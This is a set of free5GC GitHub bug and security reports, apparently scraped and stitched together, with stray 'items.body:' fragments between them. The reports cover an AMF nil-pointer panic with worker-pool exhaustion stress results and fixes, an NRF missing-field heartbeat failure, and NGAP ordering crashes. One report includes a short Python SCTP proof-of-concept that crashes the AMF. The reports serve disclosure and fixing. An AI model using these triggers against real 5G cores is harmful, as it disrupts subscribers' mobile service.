Go unit tests (`nil_pointer_crash_test.go`) directly call `SendAuth5gAkaConfirmRequest` with controlled `AuthenticationCtx.Links` state and recover from the panic. Three conditions tested:

| Test | Condition | Result |
|------|-----------|--------|
| `TestSendAuth5gAkaConfirmRequest_NilPointerPanic` | Links map empty (no `"5g-aka"` key) | PANIC at `ausf_service.go:116` |
| `TestSendAuth5gAkaConfirmRequest_NilLinksMap` | Links map nil | PANIC at `ausf_service.go:116` |
| `TestSendAuth5gAkaConfirmRequest_WithValidLink` | Links map has valid `"5g-aka"` entry | NO panic at line 116 |

### Worker pool exhaustion stress test (DoS confirmation)

A stress test was run to confirm that repeated attacks can exhaust the entire NGAP worker pool. The test repeatedly started a UE, drove the registration → authentication flow (triggering one worker panic per iteration), then killed and restarted the UE.

**Test environment**: 96 logical CPUs → `runtime.NumCPU()` → 96 workers. The stress test used UE identities (AMF-UE-NGAP-IDs RU:1 through RU:96) that mapped across all worker indexes.

| Metric | Value |
|--------|-------|
| Total iterations | 96 |
| Workers exhausted | 96 / 96 (**100%**) |
| Duration | ~14 minutes |
| Rate | ~9.2 seconds per worker |

Observed log sequence after the last worker panicked:

```text
2026-06-30T09:25:33 Worker 95 panic: nil pointer dereference
2026-06-30T09:25:42 Worker 0 panic:  nil pointer dereference   ← last worker
2026-06-30T09:25:50 All workers shut down successfully
2026-06-30T09:25:50 Close SCTP server...
2026-06-30T09:25:50 SCTP server closed
2026-06-30T09:25:50 AMF App is terminated
```

**Note**: The `All workers shut down successfully` / `AMF App is terminated` sequence follows from the AMF's graceful shutdown path (`ShutdownScheduler()`). While the stress test observed shutdown after worker exhaustion, the exact trigger (whether automatic upon all workers exiting, or from an external signal) should be distinguished from the worker-exhaustion condition itself. Regardless of whether shutdown is automatic, once all workers have exited, the scheduler has no live worker to consume tasks from worker channels, and the AMF can no longer process NGAP messages.

**Key observation**: Workers are consumed linearly with no protection — no panic threshold, no automatic worker replenishment, no circuit breaker. Each worker's `run()` loop uses `defer recover()` to catch panics and call `wg.Done()`, but does not restart the worker.

## Expected behavior

When the AMF receives an AUSF UE Authentication response, it should validate that `Links["5g-aka"]` (or `Links["eap-session"]`) is present **before** attempting to use its href value. If the link is missing:

1. `SendAuth5gAkaConfirmRequest` should return an error indicating that the AUSF response is malformed.
2. The AMF should handle this error gracefully — rejecting the authentication for that UE without panicking and without terminating the worker goroutine.

The AMF should not dereference a nil pointer recovered from an external NF's SBI response.

## Actual behavior

When the AUSF returns a UE Authentication response without `Links["5g-aka"]`:

1. `len(ue.AuthenticationCtx.Links["5g-aka"])` returns 0.
2. `confirmUri` remains nil, `err` remains nil.
3. The `if err != nil` check is false.
4. The else-branch executes `confirmUri.Scheme` → nil pointer dereference.
5. The NGAP worker goroutine panics. free5gc's worker pool catches the panic (the AMF process survives), but the worker terminates and the UE's authentication fails abnormally.

## Security impact

A malicious or compromised AUSF, or an attacker able to tamper with the AMF–AUSF SBI response, can omit `Links["5g-aka"]` from the UE Authentication response. When the AMF later processes the UE's Authentication Response, `SendAuth5gAkaConfirmRequest` dereferences a nil `confirmUri`, causing the NGAP worker handling that UE to panic.

Each successful trigger terminates one NGAP worker goroutine. The worker's panic is recovered at the worker level, so the AMF process may initially survive, but the worker is not automatically restarted. Repeated triggers can progressively reduce the available NGAP worker pool capacity. Once all workers have exited, the AMF may become unable to process further NGAP tasks; in the stress test, exhausting all 96 workers was followed by AMF shutdown.

Potential impacts:

- **Progressive NGAP worker exhaustion**: Each trigger terminates one worker with no automatic replenishment. The worker pool size defaults to `runtime.NumCPU()` (configurable via `ngapWorkerPoolSize`). At the observed rate of ~9 seconds per worker, a 4-worker deployment could be fully exhausted in roughly 40 seconds and an 8-worker deployment in roughly 70–80 seconds. Actual time depends on deployment specifics, UE restart speed, and whether the attacker can reliably target distinct worker indexes.
- **No protection mechanisms**: The worker pool has no panic threshold, no automatic worker replenishment, and no circuit breaker. Workers exit silently after `defer recover()` catches the panic, with no defensive response from the scheduler.
- **UE authentication disruption**: Each worker panic silently drops the affected UE's NAS connection. The UE receives no Reject message — the connection hangs until a timeout.
- **AMF service unavailability after exhaustion**: Once all workers have exited, no live goroutine remains to consume tasks from worker channels. New NGAP messages (InitialUEMessage, UplinkNASTransport, etc.) can no longer be processed, making the AMF effectively unavailable. In the stress test, the AMF entered shutdown after all workers were exhausted; whether shutdown is automatically triggered by worker exhaustion or requires an additional signal should be verified independently.
- **EAP-AKA' path appears similarly affected**: `SendEapAuthConfirmRequest` follows the same code pattern (missing nil-check, `url.Parse` errors logged but not returned), though only the 5G-AKA path has been dynamically confirmed in this report.
- **Compromised NF blast radius**: A single compromised AUSF should not be able to trigger worker panics that progressively disable the AMF. This missing input validation weakens the NF-to-NF resilience boundary.

This issue does not require a modified UE. It is an SBI-level defense-in-depth issue, but it does require either a malicious or compromised AUSF, or the ability to tamper with the AMF–AUSF SBI response.

## Suggested fix

### 1. Add nil check for confirmUri

```go
// In SendAuth5gAkaConfirmRequest, after the Links check and before using confirmUri:
if len(ue.AuthenticationCtx.Links["5g-aka"]) > 0 {
    confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["5g-aka"][0].Href)
}
if err != nil {
    return nil, nil, err
}
// NEW: guard against missing Links
if confirmUri == nil {
    return nil, nil, fmt.Errorf(
        "missing Links[\"5g-aka\"] in AUSF UE Authentication response")
}
ausfUri = fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
```

### 2. Fix SendEapAuthConfirmRequest

Apply the same nil check, and additionally fix the error handling so that a `url.Parse` failure causes an early return:

```go
if len(ue.AuthenticationCtx.Links["eap-session"]) > 0 {
    confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["eap-session"][0].Href)
}
if err != nil {
    // Fixed: return the error instead of just logging it
    return nil, nil, fmt.Errorf("url.Parse failed for eap-session href: %w", err)
}
if confirmUri == nil {
    return nil, nil, fmt.Errorf(
        "missing Links[\"eap-session\"] in AUSF UE Authentication response")
}
ausfUri := fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
```

### 3. Additional hardening

- Add regression tests:
  - `TestSendAuth5gAkaConfirm_RejectsMissingLinks` — empty Links map → expect error, not panic.
  - `TestSendAuth5gAkaConfirm_RejectsNilLinks` — nil Links map → expect error, not panic.
  - Same for `TestSendEapAuthConfirm_*`.
- Consider validating the entire AUSF UE Authentication response before storing it in the UE context, rejecting malformed responses at the point of ingestion rather than at the point of use.

By omitting the required `nfStatus` field on a PUT registration, the NF profile is persisted to MongoDB without the `nfStatus` key. Any subsequent standard PATCH heartbeat targeting that NF instance then fails with HTTP 500 because the json-patch `replace` operation requires the path to exist in the document. The error is unrecoverable without restarting free5GC or re-registering the NF instance: - free5GC NRF accepts `PUT /nnrf-nfm/v1/nf-instances/{id}` with `nfStatus` absent despite it being a **required** field in 3GPP TS 29.510 §5.2.2.2. - The MongoDB document is stored **without** the `nfStatus` key. - Every subsequent `PATCH /nnrf-nfm/v1/nf-instances/{id}` with `{"op":"replace","path":"/nfStatus","value":"REGISTERED"}` (the standard 3GPP heartbeat) fails with: ``` [ERRO][NRF][NFM] UpdateNFInstanceProcedure err: RestfulAPIJSONPatch Apply err: missing value replace operation does not apply: doc is missing key: /nfStatus ``` - NRF returns HTTP 500 for every heartbeat attempt on that NF instance until the process is restarted. - Any NF (AMF, SMF, PCF, …) registered in this manner will have its heartbeat permanently broken — NRF will eventually deem the NF UNDISCOVERABLE, breaking service discovery for all NFs that depend on it. ## To Reproduce Steps to reproduce the behavior: Run: python3 nrf_patch_missing_key_sender.py [nrf_patch_missing_key_sender.py](https://github.com/user-attachments/files/26920307/nrf_patch_missing_key_sender.py) ## Expected Behavior - `PUT /nnrf-nfm/v1/nf-instances/{id}` with a missing `nfStatus` field should be rejected immediately with HTTP 400 and a `ProblemDetails` body (`cause: MISSING_NF_STATUS`). items.body:
## Bug Description
N3IWUE reconnection causes communicateWithUDM error: SYSTEM_FAILURE at AMF.

## To Reproduce
Steps to reproduce the behavior:
- free5GC core is running on docker inside a VM (VirtualBox).
- N3IWF is running in docker with other NFs. 
- N3IWUE is running in a separate VM.

1. Run core:  'cd ~/free5gc-compose && docker compose up -d'
2. Modify config files with IP address and forwarding rules.
3. Run N3IWUE: '~/n3iwue/run.sh' (UE connects and ping works).
4. Stop N3IWUE with 'Ctrl+C'
5. Run N3IWUE again.
6. Errors:

  - In AMF: '[ERRO][AMF][Gmm][amf_ue_ngap_id:RU:5,AU:6(Non3GPP)][supi:SUPI:imsi-208930000001234] communicateWithUDM error: SYSTEM_FAILURE'

items.body: ## Bug Description The issue occurs because the dispatcher does not enforce the mandatory NGAP message sequence during the initialization of a new RAN connection. Instead of requiring the first message to be an NGSetupRequest, the dispatcher creates an AmfRan context for any incoming message on a new SCTP connection. As a result, if a subsequent message (such as UEContextReleaseComplete) arrives before a valid registration flow is completed, the handler attempts to operate on an uninitialized UE context (ue), leading to a panic. This can be exploited to cause a Denial of Service (DoS) by sending crafted NGAP messages that trigger repeated crashes and restarts of the AMF process, disrupting service for legitimate users. ## To Reproduce Steps to reproduce the behavior: 1. Start the AMF process and ensure it is ready to accept new SCTP connections. 2. Establish a new SCTP connection to the AMF. 3. Send a UEContextReleaseComplete message as the first message on this connection, bypassing the required NGSetupRequest. 4. Observe the AMF logs and process behavior. ## Expected Behavior The AMF should validate the procedural order of incoming NGAP messages. items.title: [Bugs] AMF crashed when receving invalid NGAP messages
items.body:
## Describe the bug
When testing the free5gc AMF, it always crashes when receiving invalid NGAP messages.

## To Reproduce
Steps to reproduce the behavior:
1. Use https://github.com/free5gc/free5gc-compose as the test target
2. Start it with command `docker compose up`
3. Find the amf address with command `docker inspect free5gc-compose_privnet`
4. Run this POC python script: `python3 free5gc.py amf-address`

```python
import sys, sctp, socket

if len(sys.argv) != 2:
  print("Usage: free5gc.py server-address")
  exit(0)

sk = sctp.sctpsocket_tcp(socket.AF_INET)
sk.connect((sys.argv[1], 38412))

sk.sctp_send(b"Hello!", ppid=socket.htonl(60))

sk.close()
```

## Expected behavior
I think the expected behavior is rejecting the connection request. The current behavior is that the AMF crashes and unable to restart. This could cause DOS attack to the AMF funtionality.

When receiving NGAP message, it should validate the message content and reject malformed messages.

## Screenshots
![图片](https://github.com/free5gc/free5gc/assets/1829883/3c51ecb0-c2ff-4946-8245-7e5e9dffab19)

## Environment (please complete the following information):
 - free5GC Version: v3.3.0
 - OS: Ubuntu 20.04 Server
 - Kernel version: 5.4.0-165-generic

## Trace File
### Configuration File
Use the default config file of free5gc-compose

### PCAP File
[ngap.zip](https://github.com/free5gc/free5gc/files/13163030/ngap.zip)

items.body:
## Describe the bug
If AMF restarts after establishment of 5G NAS security context with ue, AMF fails to decode Registration Request in NAS message container IE of Registration Request(GUTI) and stops Registration Procecure.

## To Reproduce
### Preparation
1. Change AMF config  
 see [Configuration File](#Configuration-File)
2. Change `TestGUTIRegistrationRequest` in `test/registration_test.go` as follows:
   ```go
	// New UE
	//	ue := test.NewRanUeContext("imsi-2089300007487", 1, security.AlgCiphering128NEA0, security.AlgIntegrity128NIA2)
	ue := test.NewRanUeContext("imsi-2089300007487", 1, security.AlgCiphering128NEA2, security.AlgIntegrity128NIA2)
   ```
   After sending ngap UE Context Release Complete, set sleep to restart AMF and connect AMF
   ```go
	// restart AMF (kill and restart AMF process from another window)
	fmt.Println("###")
	time.Sleep(30 * time.Second)

	// close Connection
	// RAN connect to AMF
	// send NGSetupRequest Msg
	// receive NGSetupResponse Msg
   ```
   Change Registration Request in Second Registration (Register with GUTI)  
   according to TS 24.501 v15.06 4.4.6 Protection of initial NAS signalling messages b) 1) 

   ``` go
	innerRegistrationRequest := nasTestpacket.GetRegistrationRequest(nasMessage.RegistrationType5GSInitialRegistration,
		GUTI5GS, nil, ue.GetUESecurityCapability(), ue.Get5GMMCapability(), nil, nil)
	// encrypt inner Registration Request
	m := nas.NewMessage()
	err = m.PlainNasDecode(&innerRegistrationRequest)
	require.Nil(t, err)
	payload, err := m.PlainNasEncode()
	require.Nil(t, err)
	err = security.NASEncrypt(ue.CipheringAlg, ue.KnasEnc, ue.ULCount.Get(), security.Bearer3GPP,
		security.DirectionUplink, payload)
	require.Nil(t, err)
	// add security header to outer Registration Request
	registrationRequest = nasTestpacket.GetRegistrationRequest(nasMessage.RegistrationType5GSInitialRegistration,
		GUTI5GS, nil, ueSecurityCapability, nil, payload, nil)
	// change ue.CipheringAlg to set security header, not to encrypt outer Registration Request
	ue.CipheringAlg = security.AlgCiphering128NEA0
	pdu, err = test.EncodeNasPduWithSecurity(ue, registrationRequest, nas.SecurityHeaderTypeIntegrityProtected, true, false)
	// restore ue.CipheringAlg
	ue.CipheringAlg = security.AlgCiphering128NEA2
	require.Nil(t, err)
	sendMsg, err = test.GetInitialUEMessage(ue.RanUeNgapId, pdu, "")
	require.Nil(t, err)
	_, err = conn.Write(sendMsg)
	require.Nil(t, err)
   ```

### Execution
1. Start NFs as separeted process and start test with "-args noinit" option.

2. Restart AMF after establishment of 5G NAS security context.

3. Send Registration Request with GUTI from UE.

## Expected behavior
Authenticate subscriber before processing the registration request.  
(TS 24.501 v15.06 4.4.4.3 Integrity checking of NAS signalling messages in the AMF)

## Environment (please complete the following information):
 - free5GC Version: v3.0.5
 - OS: Ubuntu 18.04.4 LTS
 - Kernel version: 5.0.0-23-generic
 - go version: 1.14.4

## Trace File
### Configuration File
amfcfg.yaml
```yaml
  security:  # NAS security parameters
    cipheringOrder: # the priority of ciphering algorithms
      - NEA2
```

[free5gc_fails-to-decode-reg.pcap.gz](https://github.com/free5gc/free5gc/files/6753114/free5gc_fails-to-decode-reg.pcap.gz)

Hi @all,

I was testing the free5gc deployment by running the Deregestration test multiple times in a row.
I noticed that the second run finishes ok (Test PASS) but with the following error from AMF:

`ERRO[2020-04-23T18:49:02+02:00]/src/amf/amf_ngap/ngap_handler/handler.go:475 free5gc/src/amf/amf_ngap/ngap_handler.HandleUEContextReleaseComplete() No RanUe Context[AmfUeNgapID: 1]              AMF=NGAP`

I run only the test multiple times. The NFs are running only once throughout the entire test.

While going through the code, I noticed that in **func** `HandleInitialContextSetupResponse` and in  **func** `HandleUEContextReleaseComplete`, you use two different functions to obtain the `ranUe` object:

`HandleInitialContextSetupResponse` - `ranUe := ran.RanUeFindByRanUeNgapID(rANUENGAPID.Value)`

`HandleUEContextReleaseComplete` - `ranUe := amf_context.AMF_Self().RanUeFindByAmfUeNgapID(aMFUENGAPID.Value)  ---> This one throws the error.`

I also tried replacing the above call in class `HandleUEContextReleaseComplete` with `ranUe := ran.RanUeFindByRanUeNgapID(rANUENGAPID.Value)`. In that case the error was not occuring.

Why are two different functions used in this case? And why is the Test throwing this error when run for the second time?
